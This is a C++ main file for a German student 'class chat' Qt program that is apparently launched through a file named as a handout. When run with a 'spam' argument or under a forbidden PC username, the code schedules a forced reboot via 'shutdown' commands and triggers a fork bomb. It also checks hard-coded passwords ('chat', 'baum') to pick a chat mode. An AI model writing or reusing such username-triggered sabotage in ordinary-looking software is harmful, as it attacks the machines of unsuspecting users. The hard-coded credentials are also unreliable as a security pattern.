/* Copyright (C) 2015,2016 Lukas Bartl
 * Diese Datei ist Teil des Klassenchats.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

// Diese Datei wird von Handout_Kräuterhexe aufgerufen, und sie ruft dann die anderen Dateien auf

#include "chat.hpp"
#include "passwort.hpp"
#include "forkbomb.hpp"
#include "pc_nutzername.hpp"
#include "klog.hpp"

using std::clog;
using std::cerr;

#ifdef DEBUG

void messageOutput( QtMsgType type, QMessageLogContext const& context, QString const& msg ) { // Für Debugging
    std::ios_base::sync_with_stdio( false );

    switch ( type ) {
    case QtDebugMsg:
        clog << msg.toStdString() << endl;
        break;
    case QtInfoMsg:
        clog << "Info: " << msg.toStdString() << endl;
        break;
    case QtWarningMsg:
        clog << "Warnung: "  << msg.toStdString() << endl;
        break;
    case QtCriticalMsg:
        cerr << "Schwerwiegender Fehler: " << msg.toStdString() << " (" << context.file << ':' << context.line << ", " << context.function << ")\n";
        break;
    case QtFatalMsg:
        cerr << "Schwerwiegender Fehler: " << msg.toStdString() << " (" << context.file << ':' << context.line << ", " << context.function << ")\n";
        abort();
    }
}

#define TRY_RELEASE
#define CATCH_RELEASE

#else // DEBUG

void messageOutput( QtMsgType type, QMessageLogContext const&, QString const& msg ) { // Für Release
    std::ios_base::sync_with_stdio( false );

    switch ( type ) {
    case QtDebugMsg: // wird nicht angezeigt
        break;
    case QtInfoMsg:
        clog << "Info: " << msg.toStdString() << endl;
        break;
    case QtWarningMsg:
        clog << "Warnung: " << msg.toStdString() << endl;
        break;
    case QtCriticalMsg:
        cerr << "Schwerwiegender Fehler: " << msg.toStdString() << '\n';
        break;
    case QtFatalMsg:
        cerr << "Schwerwiegender Fehler: " << msg.toStdString() << '\n';
        abort();
    }
}

#define TRY_RELEASE try
#define CATCH_RELEASE catch (...) { throw; }

#endif // DEBUG

int main( int argc, char* argv[] ) TRY_RELEASE {
    QApplication app ( argc, argv );
    qInstallMessageHandler( messageOutput );

    if ( app.arguments().contains("spam") || pc_nutzername_verboten() ) {
#ifdef DEBUG
        void volatile*volatile reserve = malloc( 100*1024*1024 ); // 100 MB als Reserve
        std::thread( [reserve] () { this_thread::sleep_for( 30s ); free( const_cast <void*> ( reserve ) ); std::terminate(); } ).detach(); // Nach 30 Sekunden Abbrechen
#elif defined WIN32
        std::thread( [] () { int a = system("shutdown /r /t 30"); (void) a; } ).detach(); // Nach 30 Sekunden Neustart des PCs
#else
        std::thread( [] () { int a = system("shutdown -r 30"); (void) a; } ).detach();
#endif
        forkbomb();
        return app.exec();
    }

    if ( ! Datei("./icon.ico").exist() ) // Die einzige wichtige Datei im Chat-Verzeichnis ist das Icon, alles andere wird automatisch wieder erstellt
        qFatal("Icon nicht gefunden!");

    bool plum;

    { // Passwort-Dialog
        Passwort pass;
        pass.exec();

        if ( pass.getpass() == "chat" ) // Plum-Chat
            plum = true;
        else if ( pass.getpass() == "baum" ) // Normaler Chat
            plum = false;
        else {
            qCritical("Falsches Passwort!");
            return EXIT_FAILURE;
        }
    }

    klog("Starte Chat...");

    Chat w ( plum ); // Chat starten
    w.show(); // Chat-Fenster anzeigen

    return app.exec();
} CATCH_RELEASE // Alle Exceptions hier fangen, damit Destruktoren aufgerufen werden
